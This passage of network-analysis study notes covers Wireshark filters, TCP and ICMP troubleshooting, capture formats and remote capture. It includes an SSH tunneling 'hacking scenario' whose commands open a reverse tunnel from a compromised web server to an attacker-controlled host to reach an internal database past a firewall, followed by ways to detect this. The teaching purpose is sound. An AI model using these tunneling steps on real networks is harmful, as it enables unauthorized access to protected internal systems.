+```
+
+### Full HTTP Session Flow
+```
+Packet analysis order:
+1. TCP 3-Way Handshake (SYN → SYN+ACK → ACK)
+2. HTTP Request (GET / HTTP/1.1)
+3. HTTP Response (200 OK + data)
+4. TCP 4-Way Disconnect (FIN → ACK → FIN → ACK)
+
+Reconstruct full HTTP content via Follow TCP Stream:
+Right-click packet → Follow → TCP Stream
+→ View entire plaintext HTTP request/response
+→ Credentials, form data, cookies, etc. exposed
+```
+
+### TCP Problem Pattern Analysis
+```
+TCP Retransmission:
+  Cause: packet loss, no response, unstable connection
+  Filter: tcp.analysis.retransmission
+  Response: check line quality
+
+TCP Duplicate ACK:
+  Cause: out-of-order packets
+  Filter: tcp.analysis.duplicate_ack
+  → 3 or more consecutive occurrences trigger Fast Retransmit
+
+TCP Zero Window:
+  Cause: receive buffer full
+  Filter: tcp.window_size == 0
+  → Suspected server overload or memory shortage
+
+TCP Reset (RST):
+  Cause: ACL block, closed port, firewall rejection
+  Filter: tcp.flags.reset == 1
+  → Many occur on closed ports during port scans
+```
+
+### ICMP Analysis
+```
+ICMP type meanings:
+  Type 0  = Echo Reply (ping response)
+  Type 3  = Destination Unreachable
+    Code 0  = Net Unreachable
+    Code 1  = Host Unreachable
+    Code 3  = Port Unreachable
+    Code 13 = Administratively Prohibited (firewall block)
+  Type 8  = Echo Request (ping request)
+  Type 11 = Time Exceeded (TTL expired, used by traceroute)
+
+How traceroute works:
+  TTL=1 packet → first router returns ICMP Type 11 (reveals router IP)
+  TTL=2 packet → second router returns ICMP Type 11
+  ... when destination is reached, ICMP Type 0 (Echo Reply)
+
+Wireshark filters:
+  icmp.type == 11   # TTL Exceeded → trace traceroute path
+  icmp.type == 3 && icmp.code == 13   # check firewall block
+```
+
+---
+
+## 13. SSH Tunneling Hacking Scenario (Firewall Bypass)
+
+### Scenario: Accessing an Internal DB Server Behind a Firewall
+```
+Environment:
+  Attacker PC     : 200.200.200.100
+  Attacker SSH server: 200.200.200.110
+  Victim web server: 100.100.100.100 (firewall allows)
+  Victim DB server : 192.168.1.100  (firewall blocks - private IP)
+
+Prerequisites:
+  - Compromised web server via web hacking
+  - Obtained DB connection info from web server's DB connection scripts
+  - Firewall blocks direct access to the DB server
+
+Attack steps:
+Step 1: Create a reverse tunnel from web server to attacker's SSH server
+  (execute on web server)
+  ssh -R 3306:192.168.1.100:3306 attacker@200.200.200.110
+  → attacker SSH server's port 3306 → forwarded to internal DB server's 3306
+
+Step 2: Connect to the forwarded port on SSH server from attacker PC
+  mysql -h 200.200.200.110 -P 3306 -u dbuser -p
+
+  Or add local forwarding:
+  ssh -L 3306:localhost:3306 attacker@200.200.200.110
+  mysql -h 127.0.0.1 -P 3306 -u dbuser -p
+```
+
+### Detecting SSH Tunneling
+```
+Network analysis points:
+  1. SSH connections on non-standard ports (not port 22)
+  2. Abnormally high data volume within an SSH session
+  3. Unusual SSH session duration in firewall logs
+  4. Pattern of accessing various internal services within the same SSH session
+
+Wireshark filter:
+  tcp.port == 22 && tcp.len > 0    # SSH data transfer
+  # SSH is encrypted, content cannot be inspected → analyze by behavioral patterns
+```
+
+---
+
+## 14. Wireshark Capture File Formats and Tools
+
+### Supported Capture File Formats (Input)
+```
+libpcap / tcpdump (.pcap)      - most universal
+pcapng (.pcapng)               - enhanced pcap (includes metadata)
+Snort, Wireshark               - native formats
+Network Monitor (.cap)         - Microsoft
+NetFlow                        - Cisco traffic analysis
+```
+
+### Data Export Formats
+```
+File → Export Objects:
+  HTTP   - extract files transferred over HTTP (images, documents, binaries)
+  SMB    - extract files shared over SMB
+  DICOM  - medical imaging files
+  TFTP   - files transferred via TFTP
+  IMF    - email messages
+
+File → Export Specified Packets:
+  Save only filtered packets to a new file
+
+File → Export Packet Dissections:
+  Plain Text, CSV, PSML(XML), PDML(XML), C Arrays
+```
+
+### Configuring Capture Stop Conditions (Capture Options)
+```
+Stop capture after [N] packets   - based on packet count
+Stop capture after [N] files     - based on file count
+Stop capture after [N] megabytes - based on file size
+Stop capture after [N] seconds   - based on time
+
+Ring Buffer (file rotation):
+  Create a new file every [N] megabytes/seconds
+  Ring buffer with [N] files → automatically delete old files
+  → Useful for managing disk space during long-term captures
+```
+
+### Remote Interface Capture
+```
+Install the rpcapd daemon on the remote machine, then:
+Capture → Options → Add new interfaces → Remote interfaces
+  Host: remote IP
+  Port: 2002 (default)
+  → Analyze remote server traffic in local Wireshark
 ```
